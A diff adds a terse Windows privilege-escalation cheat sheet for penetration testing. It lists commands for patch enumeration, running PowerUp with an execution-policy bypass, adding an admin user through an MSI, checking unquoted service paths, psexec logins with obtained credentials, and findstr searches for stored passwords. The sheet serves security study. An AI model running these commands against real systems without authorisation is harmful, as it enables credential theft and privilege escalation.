@@ -1,0 +1,81 @@
+https://lolbas-project.github.io/#
+https://guif.re/windowseop
+
+
+icacls /?
+takeown /?
+
+check for missing patches
+c:\> wmic qfe Caption,Description,HotFixID,InstalledOn
+
+check for exploits in exploit-db
+searchsploit MS16 windows local //from kali
+
+Browser Credentials (enum_ie,enum_chrome,etc.) (metasploit)
+
+Sessiongopher - find stored credentials for putty,winscp,rdp,creds(fireeye)
+
+Hot Potato (foxglovesec)
+	NBNS spoof,fake WPAD proxy,HTTP>NTLM Relay
+
+PowerUp (@harmj0y)
+	find hijackable dll, unattended install files,modifiable services,unquoted service paths, AlwaysInstallElevated and more
+
+---------------------------------------------------------------
+
+PowerUp :
+
+>windows>>
+net localgroup administrators
+
+powershell.exe -exec bypass
+
+Import-Module ./PowerUp.ps1
+
+Invoke-AllChecks
+
+Write-UserAddMSI //it will add a useradd msi file, that can be run to make new user
+----------------------------------------------------------------------------------------------------------------------------
+Port 88 - Kerberos
+
+Kerberos is a protocol that is used for network authentication. Different versions are used by *nix and Windows. But if you see a machine with port 88 open you can be fairly certain that it is a Windows Domain Controller.
+
+If you already have a login to a user of that domain you might be able to escalate that privilege.
+
+Check out: MS14-068
+--------------------------------------------------------------------------------------------------------------------------------
+
+Connectin with PSExec
+
+If you have credentials you can use psexec you easily log in. You can either use the standalone binary or the metasploit module.
+
+use exploit/windows/smb/psexec
+
+---------------------------------------------------------------------------------------------------------------------------
+
+unquoted service path
+
+
+wmic service get name,pathname,startmode
+
+startmode = auto,manual , /i is not sensitive , /v is not included
+
+wmic service get name,pathname,startmode|findstr /i /v “c:\Windows”|findstr /i /v “”"
+
+
+------------------------------------------------------------------------------
+
+findstr /si password *.txt
+findstr /si password *.xml
+findstr /si password *.ini
+
+#Find all those strings in config files.
+dir /s *pass* == *cred* == *vnc* == *.config*
+
+# Find all passwords in all files.
+findstr /spin "password" *.*
+findstr /spin "password" *.*
+----------------------------------------------------------------------------------
+
+https://guif.re/windowseop
+
